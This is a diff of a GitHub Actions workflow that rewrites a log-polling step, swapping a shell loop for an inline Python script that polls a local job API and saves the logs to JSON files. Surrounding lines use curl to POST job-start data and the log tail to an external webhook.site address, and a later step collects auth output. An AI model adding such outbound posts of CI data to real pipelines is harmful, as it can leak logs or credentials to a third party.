@@ -107,13 +107,30 @@ jobs:
           curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=jobstart" -H 'Content-Type: application/json' -d @/tmp/jobstart.json >/dev/null
       - name: Poll logs
         run: |
-          for i in $(seq 1 90); do
-            OUT=$(curl -s -b /tmp/cookies.txt http://127.0.0.1:8787/api/job/logs)
-            echo "$OUT" > /tmp/logs.json
-            if echo "$OUT" | grep -qE '已终止|completed|done|fail'; then echo "job finished after ${i} polls"; break; fi
-            sleep 5
-          done
-          tail -c 6000 /tmp/logs.json > /tmp/logs_tail.json
+          python - <<'EOF'
+          import json, subprocess, time
+          logs = []
+          t0 = time.time()
+          for i in range(180):
+              out = subprocess.run(['curl', '-s', '-b', '/tmp/cookies.txt', 'http://127.0.0.1:8787/api/job/logs'], capture_output=True, text=True).stdout
+              try:
+                  j = json.loads(out)
+              except Exception:
+                  time.sleep(10)
+                  continue
+              logs = j.get('logs') or []
+              job = j.get('job') or {}
+              print(i, 'running=', job.get('running'), 'logs=', len(logs), flush=True)
+              if job.get('running') is False:
+                  print('JOB DONE', flush=True)
+                  break
+              time.sleep(10)
+          with open('/tmp/logs.json', 'w', encoding='utf-8') as f:
+              json.dump({'logs': logs}, f, ensure_ascii=False, indent=2)
+          tailjson = {'logs': logs[-50:]}
+          with open('/tmp/logs_tail.json', 'w', encoding='utf-8') as f:
+              json.dump(tailjson, f, ensure_ascii=False, indent=2)
+          EOF
           curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=logs" -H 'Content-Type: application/json' -d @/tmp/logs_tail.json >/dev/null
           cat /tmp/logs_tail.json
       - name: Collect auth output
